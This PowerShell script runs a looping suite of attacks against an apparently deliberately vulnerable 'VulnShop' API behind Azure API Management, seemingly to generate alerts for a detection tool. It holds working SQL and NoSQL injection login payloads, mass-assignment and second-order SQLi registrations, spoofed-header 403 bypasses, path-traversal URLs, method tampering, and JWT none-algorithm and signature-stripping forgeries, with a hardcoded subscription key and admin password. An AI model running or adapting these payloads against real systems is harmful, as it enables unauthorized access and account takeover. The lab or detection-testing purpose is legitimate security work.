# working-attacks.ps1 - Focused attacks that work with current APIM setup

param(
    [string]$Target = "apim",
    [switch]$Continuous,
    [int]$Iterations = 1
)

# Configuration
$APIM_URL = "https://apim-vulnshop-t7up5q.azure-api.net/vulnshop"
$LOCAL_URL = "http://localhost:3001"
$KEY = "8722910157d34e698f969cf34c30eeb5"

# Select target
if ($Target -eq "local") {
    $BASE_URL = $LOCAL_URL
    Write-Host "[TARGET] Local Backend (bypassing APIM)" -ForegroundColor Yellow
} else {
    $BASE_URL = $APIM_URL
    Write-Host "[TARGET] Azure APIM (with subscription key)" -ForegroundColor Yellow
}

Write-Host "`n===== FOCUSED ATTACK SUITE =====" -ForegroundColor Cyan
Write-Host "Working with current APIM config" -ForegroundColor Green
Write-Host "================================`n" -ForegroundColor Cyan

# Helper function
Add-Type -AssemblyName System.Web

$iteration = 0
do {
    $iteration++
    if ($Iterations -gt 1 -or $Continuous) {
        Write-Host "`n[ITERATION $iteration]" -ForegroundColor Blue
    }
    
    $attackCount = 0
    $startTime = Get-Date
    
    # ===== LOGIN ATTACKS (Working endpoint) =====
    Write-Host "`n========== LOGIN ATTACKS (Working Endpoint) ==========`n" -ForegroundColor Red
    
    # SQL Injection in login
    @(
        @{user="admin'--"; pass="x"; desc="SQL injection with comment"},
        @{user="admin' OR '1'='1"; pass="x"; desc="OR injection"},
        @{user="admin'; SELECT * FROM users--"; pass="x"; desc="Stacked query"},
        @{user="admin"; pass="' OR '1'='1"; desc="Password field injection"},
        @{user='{"$ne": null}'; pass='{"$ne": null}'; desc="NoSQL injection"},
        @{user='{"$regex": "^admin"}'; pass='{"$regex": ".*"}'; desc="Regex injection"},
        @{user='admin"'; pass='admin123"'; desc="Quote escape test"},
        @{user="admin/**/"; pass="admin123"; desc="Comment injection"}
    ) | ForEach-Object {
        Write-Host "[LOGIN] $($_.desc)" -ForegroundColor Magenta
        
        $body = @{
            username = $_.user
            password = $_.pass
        } | ConvertTo-Json
        
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL/api/login" `
                -Method POST `
                -Headers @{"Ocp-Apim-Subscription-Key" = $KEY; "Content-Type" = "application/json"} `
                -Body $body `
                -UseBasicParsing
                
            if ($response.StatusCode -eq 200) {
                Write-Host "  [!] Login succeeded! Possible vulnerability" -ForegroundColor Red
                $content = $response.Content | ConvertFrom-Json
                if ($content.token) {
                    Write-Host "  [!] Got JWT token: $($content.token.Substring(0,20))..." -ForegroundColor Yellow
                }
            }
        } catch {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 401) {
                Write-Host "  [+] Login failed (expected)" -ForegroundColor Green
            } else {
                Write-Host "  [-] HTTP $status" -ForegroundColor Yellow
            }
        }
        $attackCount++
        Start-Sleep -Milliseconds 200
    }
    
    # ===== REGISTRATION ATTACKS =====
    Write-Host "`n========== REGISTRATION ATTACKS ==========`n" -ForegroundColor Red
    
    $timestamp = Get-Date -Format "HHmmss"
    
    # Mass assignment
    Write-Host "[REGISTER] Mass assignment attack" -ForegroundColor Magenta
    $massAssign = @{
        username = "testuser$timestamp"
        password = "test123"
        email = "test$timestamp@test.com"
        role = "admin"  # Trying to set admin role
        isAdmin = $true
        privileges = @("admin", "superuser")
    } | ConvertTo-Json
    
    try {
        $response = Invoke-WebRequest -Uri "$BASE_URL/api/register" `
            -Method POST `
            -Headers @{"Ocp-Apim-Subscription-Key" = $KEY; "Content-Type" = "application/json"} `
            -Body $massAssign `
            -UseBasicParsing
            
        Write-Host "  [!] Registration succeeded - check if admin role was assigned" -ForegroundColor Red
    } catch {
        Write-Host "  [-] HTTP $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
    }
    $attackCount++
    
    # Second-order SQL injection
    Write-Host "[REGISTER] Second-order SQL injection" -ForegroundColor Magenta
    $secondOrder = @{
        username = "user$timestamp'--"
        password = "test123"
        email = "sqli$timestamp@test.com"
    } | ConvertTo-Json
    
    try {
        $response = Invoke-WebRequest -Uri "$BASE_URL/api/register" `
            -Method POST `
            -Headers @{"Ocp-Apim-Subscription-Key" = $KEY; "Content-Type" = "application/json"} `
            -Body $secondOrder `
            -UseBasicParsing
            
        Write-Host "  [!] Malicious username registered - may trigger SQLi later" -ForegroundColor Red
    } catch {
        Write-Host "  [-] HTTP $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
    }
    $attackCount++
    
    # ===== BYPASS ATTEMPTS FOR 403 ERRORS =====
    Write-Host "`n========== 403 BYPASS ATTEMPTS ==========`n" -ForegroundColor Red
    
    # Try different headers to bypass 403
    @(
        @{header="X-Forwarded-For"; value="127.0.0.1"; desc="Localhost bypass"},
        @{header="X-Originating-IP"; value="127.0.0.1"; desc="Origin IP bypass"},
        @{header="X-Remote-IP"; value="127.0.0.1"; desc="Remote IP bypass"},
        @{header="X-Real-IP"; value="127.0.0.1"; desc="Real IP bypass"},
        @{header="X-Forwarded-Host"; value="localhost"; desc="Host bypass"},
        @{header="Origin"; value="http://localhost"; desc="Origin bypass"},
        @{header="Referer"; value="http://localhost"; desc="Referer bypass"}
    ) | ForEach-Object {
        Write-Host "[BYPASS] $($_.desc)" -ForegroundColor Magenta
        
        $headers = @{
            "Ocp-Apim-Subscription-Key" = $KEY
            $_.header = $_.value
        }
        
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL/api/products" `
                -Headers $headers `
                -UseBasicParsing
                
            Write-Host "  [!] Bypass successful! Got HTTP 200" -ForegroundColor Red
            Write-Host "  [!] Header '$($_.header): $($_.value)' bypassed 403" -ForegroundColor Yellow
        } catch {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 403) {
                Write-Host "  [-] Still blocked (403)" -ForegroundColor Gray
            } else {
                Write-Host "  [*] Different response: HTTP $status" -ForegroundColor Yellow
            }
        }
        $attackCount++
        Start-Sleep -Milliseconds 100
    }
    
    # ===== URL MANIPULATION =====
    Write-Host "`n========== URL MANIPULATION ==========`n" -ForegroundColor Red
    
    @(
        "/api/products",
        "/api/Products",  # Case variation
        "/api//products",  # Double slash
        "/api/./products",  # Current directory
        "/api/products/",  # Trailing slash
        "/api/products?",  # Empty query
        "/api/products#",  # Fragment
        "/api/products;",  # Semicolon
        "/api/products.json",  # Extension
        "/api/v1/products",  # Version prefix
        "/api/products/../../api/products"  # Path traversal
    ) | ForEach-Object {
        Write-Host "[URL] Testing: $_" -ForegroundColor Magenta
        
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL$_" `
                -Headers @{"Ocp-Apim-Subscription-Key" = $KEY} `
                -UseBasicParsing
                
            Write-Host "  [!] Success with URL manipulation: HTTP 200" -ForegroundColor Red
        } catch {
            $status = $_.Exception.Response.StatusCode.value__
            Write-Host "  [-] HTTP $status" -ForegroundColor Gray
        }
        $attackCount++
    }
    
    # ===== HTTP METHOD TAMPERING =====
    Write-Host "`n========== HTTP METHOD TAMPERING ==========`n" -ForegroundColor Red
    
    @("GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT") | ForEach-Object {
        Write-Host "[METHOD] Testing $_ method" -ForegroundColor Magenta
        
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL/api/products" `
                -Method $_ `
                -Headers @{"Ocp-Apim-Subscription-Key" = $KEY} `
                -UseBasicParsing
                
            Write-Host "  [!] $_ method allowed: HTTP $($response.StatusCode)" -ForegroundColor Red
        } catch {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 405) {
                Write-Host "  [+] Method not allowed (expected)" -ForegroundColor Green
            } else {
                Write-Host "  [-] HTTP $status" -ForegroundColor Gray
            }
        }
        $attackCount++
    }
    
    # ===== JWT ATTACKS (if we got a token) =====
    Write-Host "`n========== JWT ATTACKS ==========`n" -ForegroundColor Red
    
    # First, get a valid token
    Write-Host "[JWT] Getting valid token first..." -ForegroundColor Cyan
    try {
        $loginResponse = Invoke-WebRequest -Uri "$BASE_URL/api/login" `
            -Method POST `
            -Headers @{"Ocp-Apim-Subscription-Key" = $KEY; "Content-Type" = "application/json"} `
            -Body '{"username": "admin", "password": "admin123"}' `
            -UseBasicParsing
            
        $token = ($loginResponse.Content | ConvertFrom-Json).token
        Write-Host "  [+] Got valid JWT token" -ForegroundColor Green
        
        # Now try JWT attacks
        @(
            @{token="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9."; desc="None algorithm"},
            @{token=$token.Replace("HS256", "none"); desc="Algorithm substitution"},
            @{token=$token.Substring(0, $token.LastIndexOf('.')) + "."; desc="Signature stripping"},
            @{token="Bearer $token"; desc="Double Bearer prefix"},
            @{token=$token + "extra"; desc="Signature tampering"}
        ) | ForEach-Object {
            Write-Host "[JWT] $($_.desc)" -ForegroundColor Magenta
            
            try {
                $response = Invoke-WebRequest -Uri "$BASE_URL/api/orders" `
                    -Headers @{
                        "Ocp-Apim-Subscription-Key" = $KEY
                        "Authorization" = "Bearer $($_.token)"
                    } `
                    -UseBasicParsing
                    
                Write-Host "  [!] JWT attack succeeded: HTTP 200" -ForegroundColor Red
            } catch {
                $status = $_.Exception.Response.StatusCode.value__
                Write-Host "  [-] HTTP $status" -ForegroundColor Gray
            }
            $attackCount++
        }
    } catch {
        Write-Host "  [-] Could not get valid token" -ForegroundColor Yellow
    }
    
    # ===== CONTENT TYPE ATTACKS =====
    Write-Host "`n========== CONTENT TYPE ATTACKS ==========`n" -ForegroundColor Red
    
    @(
        @{type="application/xml"; body='<?xml version="1.0"?><login><username>admin</username><password>admin123</password></login>'},
        @{type="text/plain"; body='username=admin&password=admin123'},
        @{type="application/x-www-form-urlencoded"; body='username=admin&password=admin123'},
        @{type="multipart/form-data; boundary=----test"; body="------test`r`nContent-Disposition: form-data; name=`"username`"`r`n`r`nadmin`r`n------test--"}
    ) | ForEach-Object {
        Write-Host "[CONTENT] Testing $($_.type)" -ForegroundColor Magenta
        
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL/api/login" `
                -Method POST `
                -Headers @{
                    "Ocp-Apim-Subscription-Key" = $KEY
                    "Content-Type" = $_.type
                } `
                -Body $_.body `
                -UseBasicParsing
                
            Write-Host "  [!] Alternative content type accepted!" -ForegroundColor Red
        } catch {
            Write-Host "  [-] HTTP $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Gray
        }
        $attackCount++
    }
    
    # Summary
    $duration = (Get-Date) - $startTime
    Write-Host "`n========================================" -ForegroundColor Blue
    Write-Host "ITERATION $iteration COMPLETE" -ForegroundColor White
    Write-Host "Attacks executed: $attackCount" -ForegroundColor Cyan
    Write-Host "Duration: $($duration.TotalSeconds.ToString('F2')) seconds" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Blue
    
    if ($Continuous -or $iteration -lt $Iterations) {
        Write-Host "`n[*] Waiting 5 seconds..." -ForegroundColor Yellow
        Start-Sleep -Seconds 5
    }
    
} while ($Continuous -or $iteration -lt $Iterations)

Write-Host "`n[COMPLETE] All attack iterations finished!" -ForegroundColor Green
Write-Host "[TIP] Check Cortex for attack logs" -ForegroundColor Cyan
Write-Host "[TIP] Test locally with -Target local to bypass APIM restrictions" -ForegroundColor Cyan 